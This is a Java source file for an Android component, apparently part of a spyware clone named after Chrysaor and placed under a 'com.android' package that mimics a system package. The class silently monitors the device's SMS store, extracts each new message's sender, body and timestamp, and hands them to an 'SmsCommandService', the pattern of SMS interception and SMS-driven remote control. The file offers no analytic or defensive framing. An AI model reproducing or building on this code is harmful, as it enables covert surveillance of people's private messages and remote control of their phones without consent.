package com.android.chrysaoralike;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class SmsContentObserver extends ContentObserver {
    private static final String TAG = "SmsContentObserver";
    private static final Uri SMS_URI = Uri.parse("content://sms");
    private Context context;
    private int lastProcessedId;

    public SmsContentObserver(Context context, Handler handler, int lastProcessedId) {
        super(handler);
        this.context = context.getApplicationContext();
        this.lastProcessedId = lastProcessedId;
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = null;
        try {
            cursor = resolver.query(SMS_URI, null, null, null, "_id DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                int id = cursor.getInt(cursor.getColumnIndex("_id"));
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                long date = cursor.getLong(cursor.getColumnIndex("date"));
                if (id > lastProcessedId) {
                    lastProcessedId = id;
                    Intent intent = new Intent(context, SmsCommandService.class);
                    intent.putExtra("action", "incoming_sms");
                    intent.putExtra("sender", address);
                    intent.putExtra("body", body);
                    intent.putExtra("timestamp", date);
                    intent.putExtra("sms_id", id);
                    context.startService(intent);
                }
            }
        } catch (Exception e) { Log.e(TAG, "Error reading SMS DB", e); }
        finally { if (cursor != null) cursor.close(); }
    }

    public void setLastProcessedId(int id) { this.lastProcessedId = id; }
}